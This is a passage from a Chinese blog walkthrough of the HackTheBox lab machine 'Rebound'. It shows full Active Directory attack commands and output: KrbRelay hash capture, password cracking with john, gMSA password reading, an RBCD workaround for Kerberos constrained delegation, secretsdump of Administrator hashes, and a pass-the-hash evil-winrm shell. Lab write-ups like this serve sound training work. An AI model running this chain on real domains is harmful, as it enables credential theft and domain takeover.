PEB</span><br><span class="line">[*] GetModuleFileName: System</span><br><span class="line">[*] Init com server</span><br><span class="line">[*] GetModuleFileName: C:\Users\winrm_svc\Documents\KrbRelay.exe</span><br><span class="line">[*] Register com server</span><br><span class="line">objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAAqpryRm+AzL/k6uK/3ZCn9AogAAFAP///S8mcCLJPf9yIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:</span><br><span class="line"></span><br><span class="line">[*] Forcing cross-session authentication</span><br><span class="line">[*] Using CLSID: 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4</span><br><span class="line">[*] Spawning <span class="keyword">in</span> session 1</span><br><span class="line">[*] NTLM1</span><br><span class="line">4e544c4d535350000100000097b218e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44</span><br><span class="line">[*] NTLM2</span><br><span class="line">4e544c4d53535000020000000e000e003800000015c299e21853ef0e432bfe50000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080041dbca167204db010000000000000000000000005c00410070007000490044005c004b00000000000b000000</span><br><span class="line">[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED</span><br><span class="line">[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons</span><br><span class="line">[*] NTLM3</span><br><span class="line">tbrady::rebound:1853ef0e432bfe50:482b499708d53799e6e59dd60a1a7894:010100000000000041dbca167204db01e648a7f8ca8ef5e60000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080041dbca167204db0106000400060000000800300030000000000000000100000000200000a35c1be83964849fb83b4ee054d903d3e13eab8900e2d37f226c3313a120c7440a00100000000000000000000000000000000000090000000000000000000000</span><br><span class="line">System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))</span><br><span class="line">   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid&amp; pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)</span><br><span class="line">   at KrbRelay.Program.Main(String[] args)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功返回了”tbrady”用户的Net-ntlm hash，尝试用john破解</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ john tbrady.hash --wordlist=/usr/share/wordlists/rockyou.txt       </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">543BOMBOMBUNmanda (tbrady)     </span><br><span class="line">1g 0:00:00:04 DONE (2024-09-11 13:44) 0.2398g/s 2923Kp/s 2923Kc/s 2923KC/s 5449977..5435844</span><br><span class="line">Use the <span class="string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以成功破解，拿到”tbrady”用户的密码”543BOMBOMBUNmanda”</p>
<h3 id="滥用ACL-1"><a href="#滥用ACL-1" class="headerlink" title="滥用ACL"></a>滥用ACL</h3><p>在bloodhound中分析”tbrady”用户，发现此用户可以读取一个名为”delegator$”的机器账户的密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240911185734.png"></p>
<p>借助”bloodyAD”工具利用”tbrady”的凭据读取”delegator$”的ntlm hash;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object <span class="string">&#x27;delegator$&#x27;</span> --attr msDS-ManagedPassword</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:f7f7ea94cd22bd4129ca00bab335ceb9</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: ZhCKwN40T+v50IN1lFCkGOApU8008D+oW99yDAjZIaB1sRThOkiMLh2XW/vtZS0+ZJmP41rOCKmZSsMohCCwqJRLFC7jWFtgiFlt4eOJaTMAQcF1JVbhhXdfYf9tgxXGmeNHcjjybJPKmzpN8pc5HB1Ax8rau9Fj4myZUHTGd/+Gx96XeLGHJQ1wOyTcyRHSleSl8NREUiDNtJ5jhfpYO32TyRmXdDPY1a8ny6JsgZGyZgBeOAXnbXWaOBNl7D6FYSbQ8K0+yNjS120QUbZE/p2DASXBGIlYH0C5kLjEfP5Tu0RIOZop2vm1fU58pHfU3spUboWpbVGfx+2hEj0erQ==</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="constrained-Without-protocol-transition"><a href="#constrained-Without-protocol-transition" class="headerlink" title="constrained Without protocol transition"></a>constrained Without protocol transition</h3><p>从bloodhound中并不能看到如何从”delegator$”横向移动的路径，但从机器名字来看，不难猜测，这台机器账户和委派相关；</p>
<p>通过’”findDelegation.py”查看域委派相关信息；一看’”delegator$”对域控实现了约束委派</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ findDelegation.py rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -dc-ip dc01.rebound.htb -k</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting machine hostname</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists </span><br><span class="line">-----------  -----------------------------------  --------------  ---------------------  ----------</span><br><span class="line">delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No </span><br></pre></td></tr></table></figure>

<p>不可能用经典的”getST”来滥用约束委派，</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240911190741.png"></p>
<p>因为此约束委派设置的是”仅使用Kerberos”，这一点可以通过s4u2self申请的ST是否可转发来判断</p>
<p>为了演示这一点，运行<code>getST.py</code>失败:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ getST.py -spn http/dc01.rebound.htb -impersonate administrator <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -hashes :f7f7ea94cd22bd4129ca00bab335ceb9</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</span><br><span class="line">[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>它使用 S4U2Self 为 delegator$ 获取管理员用户的票证，然后尝试使用 S4U2Proxy 转发它，但它失败了(因为ST不可转发)；</p>
<p><code>-self</code>标志告诉<code>getSt.py</code>在 S4U2Self 之后停止，为 delegator$ 获取管理员票证。生成的票证缺少可转发标志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ getST.py -spn http/dc01.rebound.htb -impersonate administrator <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -self</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating administrator</span><br><span class="line">[*] When doing S4U2self only, argument -spn is ignored</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator@delegator<span class="variable">$@REBOUND</span>.HTB.ccache</span><br></pre></td></tr></table></figure>

<p>可以看到”Flags”字段中缺少了”forwardable”标志，说明此ST是不可转发的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ describeTicket.py administrator@delegator\<span class="variable">$@REBOUND</span>.HTB.ccache</span><br><span class="line"></span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Number of credentials <span class="keyword">in</span> cache: 1</span><br><span class="line">[*] Parsing credential[0]:</span><br><span class="line">[*] Ticket Session Key            : b133b264334cd7f13231a428b4f68ec8</span><br><span class="line">[*] User Name                     : administrator</span><br><span class="line">[*] User Realm                    : rebound.htb</span><br><span class="line">[*] Service Name                  : delegator$</span><br><span class="line">[*] Service Realm                 : REBOUND.HTB</span><br><span class="line">[*] Start Time                    : 11/09/2024 14:04:26 PM</span><br><span class="line">[*] End Time                      : 12/09/2024 00:04:26 AM</span><br><span class="line">[*] RenewTill                     : 12/09/2024 14:02:13 PM</span><br><span class="line">[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep</span><br><span class="line">[*] KeyType                       : rc4_hmac</span><br><span class="line">[*] Base64(key)                   : sTOyZDNM1/EyMaQotPaOyA==</span><br><span class="line">[*] Kerberoast <span class="built_in">hash</span>               : $krb5tgs$18$USER<span class="variable">$REBOUND</span>.HTB$*delegator$*$72b47c0ffdda4f1189e3a591<span class="variable">$17cf8b3c216070235c1ed1a2f89e82d3a11264f7fc2c09a64b170d80a8908d7832d30e50d4467e0c83a7185b6d6be2c0acf9e55b906114af9f4adb11cf92c7cf9990452513b61bc8dcd8431ba8f537ef5aa1208a586bde16aed4c6def820f425dbcd4aeacfc6a4255f228e3ab205f073bce134869658a43e564494e38bd5dc73f01f52af6103196264484bd839cfc552678c0d6c247ea201f9bb3143bcff96e7f926d1dde3cc52e4a3edbc2aa00301748625883be58be7de90f7e012ea526f6d728321421bb7a407f59667308fad2aa27c927736c3205224a59ec73408639c96daf54690ad1ef0167e440f96ef13fca66dcf8de12f83188347df018fd0b74e6e3431ddb3e0979b93b7f98ddb9fbe31d2372beade3aeb4fc923f36ba4bf259f4c71510c414716a59cefd5588c97381ab68551a17d32ba0b3d4b10ebf1e6c5ca134a721d411f4bdc890f97eca5e03b2e9d6be82f133a21ba68ce6f88d84d503fc460ce6f639ba64d3feaee2f09fb71238b6da2e2b9158bc358a4ded351453be6b9f6a4df8f32ed9043d37f9943481eca1f8d9df54e5a44806d6ddc882a67b7d571e7678485289ef351973327037dc7b5c631260d27fc14994a8c4a80c8ab8127a15b8bb053b213dba116267778d52b111c49ab2b12954cfd1ebc07c579059933242d46789b2b4d8e8b1899625f51603211d7ed2e2f2c09ca797b1a335acb5097159bc25a0b5ff297849aabefde4e4b5b5285f48989842f618c25442d84d25c40a13bea29446f2aafedda8180e68cf6ff7a7ed16a0e518c69dfda418aae6bdb59bd59b6dc240e41446252ca499408e2ae49b43505b44db6bd393876bc128a572bd0489b7a5f05848b7903fe6d20620bed7c7a23cc82af781f61729d682f30005ca4dda90f9298f5508ce85ab2bbf71341219cc9873ad0cb1c2ba5c4168174200d4ef4db68e3e5a96d09eb5f4b881f5cb2206cf446577472db46bd07731431a5c243c894972c5d3d64eda29b77df28acaa4caaa841dc35857b2f474ba55401b52afec5ce55b61b5bcb3762b2911f9e14d211b273358698a18cbe9adff7187867b9f9ef4373787fa3659a70e7a28d40b33070d4cb1057fe518063f27604333371710a60c75143148802bd75fecd48d278459d59fd7672e164266248aa471b96f120b6d61861e57642ea5095a63a42a28d0bc96e392481dd251765ddaadfb5a7ac0c0c58071e864085008303a97f1c2552d91609e0e27fbeadf876be41e747df15b6ea6189f3d503ca4760b913dc720603405618ec1fd9f6e5134d5cd90f5900f5a6b4db0b372adfc659655fc906e22ea15bc8533ab608c1badb545c3f518e5b3a18c2a8af9263cb78d9f281f0117b8fb8de5a8be3d3443a0ad55e3dea2e5f090eabf0b54731589afbd28a32207b279fb7cea733c5499a83941ce2239d1914c807f01b7175f8e2c6aa7bdc0952f426bc12596f6abf6d2d6ac39bfdaa6b10c59a5e59d5e97460084735616d6738f657ad52c855ffeb6a9698fd6eeaf64bf7da68f6d81a7977d784c2366cc049cb66b8b523d151add5c82ced9c418afe566dd75b1dfde1f79eaf50949cc8e10ecc5d5949caef2d2edeee978ce7e791721637a403312c5851ce8a50bf7cac1701</span></span><br><span class="line">[*] Decoding unencrypted data <span class="keyword">in</span> credential[0][<span class="string">&#x27;ticket&#x27;</span>]:</span><br><span class="line">[*]   Service Name                : delegator$</span><br><span class="line">[*]   Service Realm               : REBOUND.HTB</span><br><span class="line">[*]   Encryption <span class="built_in">type</span>             : aes256_cts_hmac_sha1_96 (etype 18)</span><br><span class="line">[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained">delegations-constrained</a>文章介绍了如何基于约束委派在无协议转换的情况下通过RBCD(基于资源委派)利用；</p>
<p>我的理解:ldap_monitor是一个服务账户；将”delegator$”机器账户的”msDS-AllowedToActOnBehalfOfOtherIdentity”属性修改为”ldap_monitor”的sid，使得ldap_monitor可以模拟DC01$，拿到DC01$到”delegator$”可转发的ST;获得票证后，可以在 delegator$代表模拟用户(DC01$)发出的 S4U2proxy 请求中使用票据,使用此票据，可以获得delegator$委派DC01$的服务的服务票据，以此达到滥用委派的效果</p>
<p>脚本如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT rebound.htb/delegator\$  -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 </span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=delegator\$.ccache</span><br><span class="line"></span><br><span class="line">rbcd.py <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -delegate-from ldap_monitor -delegate-to <span class="string">&#x27;delegator$&#x27;</span> -action write -dc-ip dc01.rebound.htb -use-ldaps</span><br><span class="line"></span><br><span class="line">findDelegation.py <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -dc-ip 10.10.11.231 -k -hashes :f7f7ea94cd22bd4129ca00bab335ceb9</span><br><span class="line"></span><br><span class="line">getST.py <span class="string">&#x27;rebound.htb/ldap_monitor:1GR8t@$$4u&#x27;</span> -spn browser/dc01.rebound.htb -impersonate DC01$</span><br><span class="line"></span><br><span class="line">getST.py rebound.htb/delegator\$ -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -spn http/dc01.rebound.htb -additional-ticket DC01\<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache -impersonate DC01$</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ bash acl.sh</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> delegator$.ccache</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)</span><br><span class="line">[*] ldap_monitor can already impersonate <span class="built_in">users</span> on delegator$ via S4U2Proxy</span><br><span class="line">[*] Not modifying the delegation rights.</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting machine hostname</span><br><span class="line">AccountName   AccountType                          DelegationType              DelegationRightsTo     SPN Exists </span><br><span class="line">------------  -----------------------------------  --------------------------  ---------------------  ----------</span><br><span class="line">ldap_monitor  Person                               Resource-Based Constrained  delegator$             No         </span><br><span class="line">delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb  No         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Impersonating DC01$</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[-] Kerberos SessionError: KRB_AP_ERR_BADMATCH(Ticket and authenticator don<span class="string">&#x27;t match)</span></span><br><span class="line"><span class="string">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Impersonating DC01$</span></span><br><span class="line"><span class="string">[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self</span></span><br><span class="line"><span class="string">[*] Requesting S4U2Proxy</span></span><br><span class="line"><span class="string">[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>最后将票据提供给secretsdump.py，获得Administrator的hash；使用evil-winrm获得一个administrator shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=DC01\<span class="variable">$@http_dc01</span>.rebound.htb@REBOUND.HTB.ccache</span><br><span class="line">                                                                                                                                                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user administrator</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f</span><br><span class="line">Administrator:des-cbc-md5:ad8ac2a825fe1080</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                                                                                                                                                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ evil-winrm -i dc01 -u administrator -H 176be138594933bb67db3b2572fc91b8</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">rebound\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; hostname</span><br><span class="line">dc01</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-09-11</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 6595 words, 21 min 59 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20ReBound(HTB)%0Ahttps://zIxyd.github.io/2024/09/11/reBound/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/04/26/Mysql%E5%B0%8F%E8%AE%B0/" title="Mysql小记">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>